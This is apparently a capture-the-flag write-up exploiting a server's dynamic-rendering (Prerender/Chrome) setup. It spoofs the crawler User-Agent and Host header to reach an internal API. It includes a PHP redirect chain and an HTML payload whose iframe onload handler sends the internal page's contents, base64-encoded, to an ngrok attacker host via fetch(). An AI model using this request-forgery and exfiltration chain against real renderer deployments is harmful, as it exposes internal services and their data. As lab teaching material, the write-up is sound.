<h2>Solution</h2>

<p>The server uses something called dynamic rendering, which renders JavaScript on the server-side before serving web crawlers. This is meant to improve SEO.</p>

<p>If we look at the Nginx configuration, we can see that as long as we set our HTTP <code>User-Agent</code> header to one of the web crawlers, e.g.<code>googlebot</code>, the request is re-written and forwarded to the pre-renderer at <code>http://renderer:3000</code>.</p>

<p>```
location / {
    try_files $uri @prerender;
}</p>

<p>...</p>

<p>location @prerender {
    proxy<em>set</em>header X-Prerender-Token YOUR_TOKEN;</p>

<p>The goal is to get to <code>http://api:8000/</code>.</p>

<p><code>python
@app.route("/", methods=["GET"])
def root():
    return FLAG
</code></p>

<p>If the API server was hosted on port 80 instead, there would be no need for any exploitation - the need for subsequent exploitation stems from the fact that <code>$host</code> will strip the port number in the HTTP <code>Host</code> header, preventing us from accessing the API server at port 8000 directly.</p>

<p>I came across <a href="https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/">this post</a> which gave me the inspiration for the exploit. We know that the server uses <a href="https://github.com/tvanro/prerender-alpine">Prerender</a> to handle these requests. Since Prerender uses Chrome to render JavaScript, we can perform XSS within the renderer.</p>

<p>Set the host header so that the renderer visits our attacker-controlled site. From there, we can redirect the browser using the <code>Location</code> header.</p>

<p><code>redirect.php</code>:</p>

<p><code>php
&lt;?php 
    header("Location: http://localhost:3000/render?url=http://localhost:3000/render?url=http://0db7-115-66-195-39.ngrok.io/exploit.html");
?&gt;
</code></p>

<p>From the user's perspective, the Nginx server will return the 302 redirect, instead of the contents of the redirected site. However, the renderer's browser will still follow the redirect. It will then be redirected to our second exploit page:</p>

<p><code>exploit.html</code>:</p>

<p><code>markup
&lt;html&gt;
    &lt;body&gt;
        &lt;iframe id="iframe" src="http://localhost:3000/render?url=http://api:8000/" onload='fetch("http://0db7-115-66-195-39.ngrok.io/?"+btoa(document.getElementById("iframe").contentWindow.document.documentElement.innerHTML));'&gt;&lt;/iframe&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></p>

<p>Notice that the browser is currently on <code>http://localhost:3000</code>, viewing the pre-rendered <code>exploit.html</code>. Since both the current site and the iframe's source are <code>http://localhost:3000</code>, this bypasses SOP and allows us to access the iframe's contents through the <code>onload</code> handler.</p>
